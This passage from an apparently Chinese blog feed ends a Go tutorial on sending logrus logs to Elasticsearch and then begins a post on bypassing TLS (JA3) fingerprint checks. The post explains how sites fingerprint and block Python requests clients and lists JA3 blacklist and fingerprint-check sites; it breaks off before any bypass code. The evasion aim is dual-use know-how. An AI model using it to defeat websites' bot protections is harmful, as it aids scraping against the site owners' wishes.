EsClient *elasticsearch.Client<br><br><span class="hljs-comment">// InitEs 初始化es</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitEs</span><span class="hljs-params">()</span></span> &#123;<br>    esConn := fmt.Sprintf(<span class="hljs-string">&quot;http://%s:%s&quot;</span>, <span class="hljs-string">&quot;192.168.61.129&quot;</span>, <span class="hljs-string">&quot;9200&quot;</span>)<br>    cfg := elasticsearch.Config&#123;<br>       Addresses: []<span class="hljs-type">string</span>&#123;esConn&#125;,<br>    &#125;<br>    client, err := elasticsearch.NewClient(cfg)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Panic(err)<br>    &#125;<br>    EsClient = client<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="3-logrus实现日志推送"><a href="#3-logrus实现日志推送" class="headerlink" title="3.logrus实现日志推送"></a>3.logrus实现日志推送</h1><p>先定义一个结构体ElasticHook，其中需要实现<code>Hook</code>接口：</p><p><img src="/./../blog_image/image-20231208133151441.png" alt="image-20231208133151441"></p><p>ElasticHook结构体如图所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ElasticHook <span class="hljs-keyword">struct</span> &#123;<br>    Client        *elasticsearch.Client <span class="hljs-comment">// es的客户端</span><br>    Host          <span class="hljs-type">string</span>                <span class="hljs-comment">// es的host</span><br>    Index         IndexNameFunc         <span class="hljs-comment">// 获取索引的名字</span><br>    Level         []logrus.Level        <span class="hljs-comment">// 日志级别</span><br>    Ctx           context.Context       <span class="hljs-comment">// 上下文</span><br>    CtxCancelFunc context.CancelFunc    <span class="hljs-comment">// 上下文的函数</span><br>    FireFunc      FireFunc              <span class="hljs-comment">// 执行hook的方法</span><br>&#125;<br></code></pre></td></tr></table></figure><p>初始化es钩子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// NewElasticHook 创建一个es hook对象</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewElasticHook</span><span class="hljs-params">(client *elasticsearch.Client, host <span class="hljs-type">string</span>, level logrus.Level, index <span class="hljs-type">string</span>)</span></span> (*ElasticHook, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-keyword">return</span> newElasticHookWithFunc(client, host, level, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123; <span class="hljs-keyword">return</span> index &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>具体逻辑如图：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// newElasticHookWithFunc 创建一个es hook对象，通过IndexNameFunc这个方式</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newElasticHookWithFunc</span><span class="hljs-params">(client *elasticsearch.Client, host <span class="hljs-type">string</span>, level logrus.Level, indexFunc IndexNameFunc)</span></span> (*ElasticHook, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-keyword">var</span> levels []logrus.Level<br>    <span class="hljs-keyword">for</span> _, l := <span class="hljs-keyword">range</span> logrus.AllLevels &#123;<br>       <span class="hljs-comment">// 判断传入的level是在哪个等级上面</span><br>       <span class="hljs-keyword">if</span> level &gt;= l &#123;<br>          levels = <span class="hljs-built_in">append</span>(levels, l)<br>       &#125;<br>    &#125;<br>    ctx, cancelFunc := context.WithCancel(context.Background())<br>    <span class="hljs-keyword">return</span> &amp;ElasticHook&#123;<br>       Client:        client,<br>       Host:          host,<br>       Index:         indexFunc,<br>       Level:         levels,<br>       Ctx:           ctx,<br>       CtxCancelFunc: cancelFunc,<br>       FireFunc:      syncFireFunc,<br>    &#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>传入的level需要进行比较，比较日志是大于或等于的才会保存在这个钩子中的<code>Level</code>字段。</p><p>具体发送逻辑是<code>syncFireFunc</code>这个函数，具体用法如下：</p><p>主要是操作es逻辑。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// syncFireFunc 异步发送 实现hook函数的具体逻辑</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">syncFireFunc</span><span class="hljs-params">(entry *logrus.Entry, hook *ElasticHook)</span></span> <span class="hljs-type">error</span> &#123;<br>    msg := createMessage(entry, hook)<br>    data, err := json.Marshal(&amp;msg)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">return</span> err<br>    &#125;<br><br>    <span class="hljs-comment">// 操作es</span><br>    request := esapi.IndexRequest&#123;<br>       Index:   hook.Index(),<br>       Body:    bytes.NewReader(data),<br>       Refresh: <span class="hljs-string">&quot;true&quot;</span>,<br>    &#125;<br><br>    <span class="hljs-comment">// 发送请求</span><br>    resp, err := request.Do(hook.Ctx, hook.Client)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">return</span> err<br>    &#125;<br><br>    <span class="hljs-comment">// 解析响应</span><br>    <span class="hljs-comment">// todo 完善解析json的操作</span><br>    log.Println(resp.String())<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>将这个赋值给<code>ElasticHook</code>的<code>FireFunc</code>，在调用钩子的时候调用即可。</p><p>最终使用<code>curl --location &#39;http://localhost:9200/my_index/_search&#39;\?pretty </code></p><p>即可查看到结果</p><h1 id="4-完整代码"><a href="#4-完整代码" class="headerlink" title="4.完整代码"></a>4.完整代码</h1><p>查看<a href="">https://github.com/pow1e/es-logrus</a></p>]]></content>
    
    
    <categories>
      
      <category>golang开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tls指纹绕过</title>
    <link href="/2023/12/02/tls%E6%8C%87%E7%BA%B9%E7%BB%95%E8%BF%87/"/>
    <url>/2023/12/02/tls%E6%8C%87%E7%BA%B9%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>浏览器可以正常访问，但是用requests发送请求失败。</p><p>后端是如何监测得呢？为什么浏览器可以返回结果，而requests模块不行呢？</p><p><a href="https://cn.investing.com/equities/amazon-com-inc-historical-data">https://cn.investing.com/equities/amazon-com-inc-historical-data</a></p><p><img src="/./../blog_image/image-20231102222853489.png" alt="image-20231102222853489"></p><p><img src="/./../blog_image/image-20231102222951995.png" alt="image-20231102222951995"></p><h1 id="1-指纹校验案例"><a href="#1-指纹校验案例" class="headerlink" title="1.指纹校验案例"></a>1.指纹校验案例</h1><h2 id="1-1-案例：ascii2d"><a href="#1-1-案例：ascii2d" class="headerlink" title="1.1 案例：ascii2d"></a>1.1 案例：ascii2d</h2><p><a href="https://ascii2d.net/">https://ascii2d.net/</a></p><p><img src="/./../blog_image/image-20231102152118149.png" alt="image-20231102152118149"></p><p><img src="/./../blog_image/image-20231102152223565.png" alt="image-20231102152223565"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://ascii2d.net&quot;</span><br>)<br><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en-US&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Just a moment...<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>   ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-2-案例：investing"><a href="#1-2-案例：investing" class="headerlink" title="1.2 案例：investing"></a>1.2 案例：investing</h2><p><a href="https://cn.investing.com/equities/amazon-com-inc-historical-data">https://cn.investing.com/equities/amazon-com-inc-historical-data</a></p><p><img src="/./../blog_image/image-20231102222853489.png" alt="image-20231102222853489"></p><p><img src="/./../blog_image/image-20231102222951995.png" alt="image-20231102222951995"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://cn.investing.com/equities/amazon-com-inc-historical-data&quot;</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>    &#125;<br>)<br>res.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="1-3-案例：yuanrenxue"><a href="#1-3-案例：yuanrenxue" class="headerlink" title="1.3 案例：yuanrenxue"></a>1.3 案例：yuanrenxue</h2><p><img src="/./../blog_image/image-20231102152648185.png" alt="image-20231102152648185"></p><p><img src="/./../blog_image/image-20231102152734717.png" alt="image-20231102152734717"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://match.yuanrenxue.cn/api/match/19?page=1&quot;</span><br>)<br><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h1 id="2-TLS指纹"><a href="#2-TLS指纹" class="headerlink" title="2.TLS指纹"></a>2.TLS指纹</h1><p>如今几乎所有平台通信都是基于Https的协议，而无论基于什么工具去发送Https请求时，都需要基于TLS&#x2F;SSL先建立两端安全的通信（握手），建立后再进行数据传输。</p><p>TLS的握手阶段，客户端会向服务端发送 Client Hello 数据包，在数据包内的<code>JA3</code>就是指纹信息（基于电脑的TLS版本+内置算法等计算出来的字符串），并且该值不会随着请求头修改、代理等发生变化。所以，某个网站的后台就会去读取TLS客户端的<code>JA3</code>指纹，如果是非正常指纹，禁止访问。例如：</p><ul><li><p>requests请求</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">requests</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">2.31</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">urllib3</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">2.0</span>.<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[JA3 Fullstring: 771,4866<span class="hljs-string">-4867</span><span class="hljs-string">-4865</span><span class="hljs-string">-49196</span><span class="hljs-string">-49200</span><span class="hljs-string">-159</span><span class="hljs-string">-52393</span><span class="hljs-string">-52392</span><span class="hljs-string">-52394</span><span class="hljs-string">-49195</span><span class="hljs-string">-49199</span><span class="hljs-string">-158</span><span class="hljs-string">-49188</span><span class="hljs-string">-49192</span><span class="hljs-string">-107</span><span class="hljs-string">-49187</span><span class="hljs-string">-49191</span><span class="hljs-string">-103</span><span class="hljs-string">-49162</span><span class="hljs-string">-49172</span><span class="hljs-string">-57</span><span class="hljs-string">-49161</span><span class="hljs-string">-49171</span><span class="hljs-string">-51</span><span class="hljs-string">-157</span><span class="hljs-string">-156</span><span class="hljs-string">-61</span><span class="hljs-string">-60</span><span class="hljs-string">-53</span><span class="hljs-string">-47</span><span class="hljs-string">-255</span>,0<span class="hljs-string">-11</span><span class="hljs-string">-10</span><span class="hljs-string">-16</span><span class="hljs-string">-22</span><span class="hljs-string">-23</span><span class="hljs-string">-49</span><span class="hljs-string">-13</span><span class="hljs-string">-43</span><span class="hljs-string">-45</span><span class="hljs-string">-51</span><span class="hljs-string">-21</span>,29<span class="hljs-string">-23</span><span class="hljs-string">-30</span><span class="hljs-string">-25</span><span class="hljs-string">-24</span>,0<span class="hljs-string">-1</span><span class="hljs-string">-2</span>]<br><br>[JA3: bc29aa426fc99c0be1b9be941869f88a]<br><br>固定，所以后端API可以禁止此指纹。<br></code></pre></td></tr></table></figure></li><li><p>浏览器请求</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[JA3 Fullstring: 771,4865<span class="hljs-string">-4866</span><span class="hljs-string">-4867</span><span class="hljs-string">-49195</span><span class="hljs-string">-49199</span><span class="hljs-string">-49196</span><span class="hljs-string">-49200</span><span class="hljs-string">-52393</span><span class="hljs-string">-52392</span><span class="hljs-string">-49171</span><span class="hljs-string">-49172</span><span class="hljs-string">-156</span><span class="hljs-string">-157</span><span class="hljs-string">-47</span><span class="hljs-string">-53</span>,11<span class="hljs-string">-18</span><span class="hljs-string">-27</span><span class="hljs-string">-35</span><span class="hljs-string">-16</span><span class="hljs-string">-51</span><span class="hljs-string">-10</span><span class="hljs-string">-23</span><span class="hljs-string">-5</span><span class="hljs-string">-43</span><span class="hljs-string">-65281</span><span class="hljs-string">-65037</span><span class="hljs-string">-0</span><span class="hljs-string">-17513</span><span class="hljs-string">-13</span><span class="hljs-string">-45</span>,29<span class="hljs-string">-23</span><span class="hljs-string">-24</span>,0]<br><br>[JA3: 5ae2fe79293ec63d585f3f987cf69d01]<br><br>谷歌浏览器的JA3会变化。<br></code></pre></td></tr></table></figure></li></ul><p>扩展：有些网站专门收录ja3黑名单。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sslbl.abuse.ch<span class="hljs-regexp">/ja3-fingerprints/</span><br>https:<span class="hljs-regexp">//</span>sslbl.abuse.ch<span class="hljs-regexp">/blacklist/</span>sslblacklist.csv<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/salesforce/</span>ja3<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/lists/</span>osx-nix-ja3.csv<br>https:<span class="hljs-regexp">//</span>ja3er.com/getAllUasJson<br>https:<span class="hljs-regexp">//</span>ja3er.com/getAllHashesJson<br><br></code></pre></td></tr></table></figure><h2 id="2-1-查看指纹"><a href="#2-1-查看指纹" class="headerlink" title="2.1 查看指纹"></a>2.1 查看指纹</h2><p>想要快速查看自己的TSL指纹信息：<a href="https://tls.browserleaks.com/json">https://tls.browserleaks.com/json</a></p><p><img src="/./../blog_image/image-20231102160720074.png" alt="image-20231102160720074"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<span class="hljs-string">&#x27;https://tls.browserleaks.com/json&#x27;</span>)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20231102160648459.png" alt="image-20231102160648459"></p><p>其他网站还有：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//tls.browserleaks.com/json</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//tls.peet.ws/</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//tls.peet.ws/api/all</span><br></code></pre></td></tr></table></figure><h2 id="2-2-Wireshark"><a href="#2-2-Wireshark" class="headerlink" title="2.2 Wireshark"></a>2.2 Wireshark</h2><p>基于Wireshark抓包并筛选出Client Hello数据包，去内部查看：</p><h3 id="1-下载安装"><a href="#1-下载安装" class="headerlink" title="1.下载安装"></a>1.下载安装</h3><p>下载并安装Wireshark  <a href="https://www.wireshark.org/download.html">https://www.wireshark.org/download.html</a></p><p><img src="/./../blog_image/image-20231102162717583.png" alt="image-20231102162717583"></p><h3 id="2-抓网卡"><a href="#2-抓网卡" class="headerlink" title="2.抓网卡"></a>2.抓网卡</h3><p>打开Wireshark，选择要抓包监测的网卡，选择你上网使用的那个网卡。</p><p><img src="/./../blog_image/image-20231102162114984.png" alt="image-20231102162114984"></p><h3 id="3-筛选IP"><a href="#3-筛选IP" class="headerlink" title="3.筛选IP"></a>3.筛选IP</h3><p>筛选目标IP <code>ip.dst_host==146.56.195.149</code></p><p><img src="/./../blog_image/image-20231102162435891.png" alt="image-20231102162435891"></p><p><img src="/./../blog_image/image-20231102162148914.png" alt="image-20231102162148914"></p><h3 id="4-数据包"><a href="#4-数据包" class="headerlink" title="4.数据包"></a>4.数据包</h3><p>用浏览器或用requests发送请求，就可以监测到网络请求，然后找到 <code>Client Hello</code>数据包，就可以看到相关指纹信息。</p><p><img src="/./../blog_image/image-20231102154253441.png" alt="image-20231102154253441"></p><h2 id="2-3-ja3"><a href="#2-3-ja3" class="headerlink" title="2.3 ja3"></a>2.3 ja3</h2><p><img src="/./../blog_image/image-20231102165413527.png" alt="image-20231102165413527"></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[JA3 Fullstring: 771,4866<span class="hljs-string">-4867</span><span class="hljs-string">-4865</span><span class="hljs-string">-49196</span><span class="hljs-string">-49200</span><span class="hljs-string">-159</span><span class="hljs-string">-52393</span><span class="hljs-string">-52392</span><span class="hljs-string">-52394</span><span class="hljs-string">-49195</span><span class="hljs-string">-49199</span><span class="hljs-string">-158</span><span class="hljs-string">-49188</span><span class="hljs-string">-49192</span><span class="hljs-string">-107</span><span class="hljs-string">-49187</span><span class="hljs-string">-49191</span><span class="hljs-string">-103</span><span class="hljs-string">-49162</span><span class="hljs-string">-49172</span><span class="hljs-string">-57</span><span class="hljs-string">-49161</span><span class="hljs-string">-49171</span><span class="hljs-string">-51</span><span class="hljs-string">-157</span><span class="hljs-string">-156</span><span class="hljs-string">-61</span><span class="hljs-string">-60</span><span class="hljs-string">-53</span><span class="hljs-string">-47</span><span class="hljs-string">-255</span>,0<span class="hljs-string">-11</span><span class="hljs-string">-10</span><span class="hljs-string">-16</span><span class="hljs-string">-22</span><span class="hljs-string">-23</span><span class="hljs-string">-49</span><span class="hljs-string">-13</span><span class="hljs-string">-43</span><span class="hljs-string">-45</span><span class="hljs-string">-51</span><span class="hljs-string">-21</span>,29<span class="hljs-string">-23</span><span class="hljs-string">-30</span><span class="hljs-string">-25</span><span class="hljs-string">-24</span>,0<span class="hljs-string">-1</span><span class="hljs-string">-2</span>]<br><br>[JA3: bc29aa426fc99c0be1b9be941869f88a]<br></code></pre></td></tr></table></figure><p>关于加密相关的值：</p><ul><li><p><code>JA3</code> 是对 <code>JA3 Fullstring</code>进行md5加密的结果。</p></li><li><p><code>JA3 Fullstring</code>是由五段组成</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">JA3 gathers <span class="hljs-keyword">the</span> decimal values <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> following fields <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> Client Hello packet; <br>- SSL Version,<br>- Accepted Ciphers<br>- List <span class="hljs-keyword">of</span> Extensions<br>- Elliptic Curves<br>- Elliptic Curve Formats<br>It <span class="hljs-keyword">then</span> concatenates those values together <span class="hljs-keyword">in</span> order, <span class="hljs-keyword">using</span> <span class="hljs-keyword">a</span> <span class="hljs-string">&quot;,&quot;</span> <span class="hljs-built_in">to</span> delimit <span class="hljs-keyword">each</span> field <span class="hljs-keyword">and</span> <span class="hljs-keyword">a</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-built_in">to</span> delimit <span class="hljs-keyword">each</span> <span class="hljs-built_in">value</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">each</span> field.<br><br>JA3 为客户端发送的clienthello 数据包中的以下字段收集字节的十进制值: SSL Version, Accepted Ciphers, List <span class="hljs-keyword">of</span> Extensions, Elliptic Curves, <span class="hljs-keyword">and</span> Elliptic Curve Formats(SSL 版本、接受的密码、扩展列表、椭圆曲线和椭圆曲线格式)。然后它将这些值按顺序连接在一起，使用“，”分隔每个字段，使用“-”分隔每个字段中的每个值。<br><br><span class="hljs-keyword">https</span>://github.com/salesforce/ja3<br></code></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">SSLVersion,</span> Cipher, SSLExtension, EllipticCurve, EllipticCurvePointFormat<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">第1个值：771                                   表示SSL版本，即：TLS 1.2（0x0303），0x0303转换为10进制就是771<br><br>第2个值：4866<span class="hljs-string">-4867</span><span class="hljs-string">-4865</span><span class="hljs-string">-49196</span><span class="hljs-string">-49200</span><span class="hljs-string">-159</span><span class="hljs-string">-52393</span><span class="hljs-string">-52392</span><span class="hljs-string">-52394</span><span class="hljs-string">-49195</span><span class="hljs-string">-49199</span><span class="hljs-string">-158</span><span class="hljs-string">-49188</span><span class="hljs-string">-49192</span><span class="hljs-string">-107</span><span class="hljs-string">-49187</span><span class="hljs-string">-49191</span><span class="hljs-string">-103</span><span class="hljs-string">-49162</span><span class="hljs-string">-49172</span><span class="hljs-string">-57</span><span class="hljs-string">-49161</span><span class="hljs-string">-49171</span><span class="hljs-string">-51</span><span class="hljs-string">-157</span><span class="hljs-string">-156</span><span class="hljs-string">-61</span><span class="hljs-string">-60</span><span class="hljs-string">-53</span><span class="hljs-string">-47</span><span class="hljs-string">-255</span>        表示TLS客户端支持的加密套件。<br><br>第三个值：0<span class="hljs-string">-11</span><span class="hljs-string">-10</span><span class="hljs-string">-16</span><span class="hljs-string">-22</span><span class="hljs-string">-23</span><span class="hljs-string">-49</span><span class="hljs-string">-13</span><span class="hljs-string">-43</span><span class="hljs-string">-45</span><span class="hljs-string">-51</span><span class="hljs-string">-21</span>    表示支持的 TLS 扩展<br><br>第四个值：29<span class="hljs-string">-23</span><span class="hljs-string">-30</span><span class="hljs-string">-25</span><span class="hljs-string">-24</span>                        表示支持的支持的椭圆曲线（ECC加密算法）<br><br>第五个值：0<span class="hljs-string">-1</span><span class="hljs-string">-2</span>                                 表示支持的椭圆曲线格式<br></code></pre></td></tr></table></figure></li></ul><h3 id="1-SSLVersion"><a href="#1-SSLVersion" class="headerlink" title="1.SSLVersion"></a>1.SSLVersion</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">771<br></code></pre></td></tr></table></figure><p>将0x0303转换为10进制就是771</p><p><img src="/./../blog_image/image-20231102171445727.png" alt="image-20231102171445727"></p><h3 id="2-Cipher"><a href="#2-Cipher" class="headerlink" title="2.Cipher"></a>2.Cipher</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4866</span>-<span class="hljs-number">4867</span>-<span class="hljs-number">4865</span>-<span class="hljs-number">49196</span>-<span class="hljs-number">49200</span>-<span class="hljs-number">159</span>-<span class="hljs-number">52393</span>-<span class="hljs-number">52392</span>-<span class="hljs-number">52394</span>-<span class="hljs-number">49195</span>-<span class="hljs-number">49199</span>-<span class="hljs-number">158</span>-<span class="hljs-number">49188</span>-<span class="hljs-number">49192</span>-<span class="hljs-number">107</span>-<span class="hljs-number">49187</span>-<span class="hljs-number">49191</span>-<span class="hljs-number">103</span>-<span class="hljs-number">49162</span>-<span class="hljs-number">49172</span>-<span class="hljs-number">57</span>-<span class="hljs-number">49161</span>-<span class="hljs-number">49171</span>-<span class="hljs-number">51</span>-<span class="hljs-number">157</span>-<span class="hljs-number">156</span>-<span class="hljs-number">61</span>-<span class="hljs-number">60</span>-<span class="hljs-number">53</span>-<span class="hljs-number">47</span>-<span class="hljs-number">255</span><br></code></pre></td></tr></table></figure><p>将算法套件的十六进制表示，转换成十进制，然后再凭借起来。</p><p><img src="/./../blog_image/image-20231102171555206.png" alt="image-20231102171555206"></p><h3 id="3-SSLExtension"><a href="#3-SSLExtension" class="headerlink" title="3.SSLExtension"></a>3.SSLExtension</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>-<span class="hljs-number">11</span>-<span class="hljs-number">10</span>-<span class="hljs-number">16</span>-<span class="hljs-number">22</span>-<span class="hljs-number">23</span>-<span class="hljs-number">49</span>-<span class="hljs-number">13</span>-<span class="hljs-number">43</span>-<span class="hljs-number">45</span>-<span class="hljs-number">51</span>-<span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><p>SSL中所有的扩展对应的数字</p><p><img src="/./../blog_image/image-20231102174433762.png" alt="image-20231102174433762"></p><h3 id="4-EllipticCurve"><a href="#4-EllipticCurve" class="headerlink" title="4.EllipticCurve"></a>4.EllipticCurve</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">29</span>-<span class="hljs-number">23</span>-<span class="hljs-number">30</span>-<span class="hljs-number">25</span>-<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>将supported_groups对应的十六进制转换成十进制。</p><p><img src="/./../blog_image/image-20231102173836479.png" alt="image-20231102173836479"></p><h3 id="5-EllipticCurvePointFormat"><a href="#5-EllipticCurvePointFormat" class="headerlink" title="5.EllipticCurvePointFormat"></a>5.EllipticCurvePointFormat</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>-<span class="hljs-number">1</span>-<span 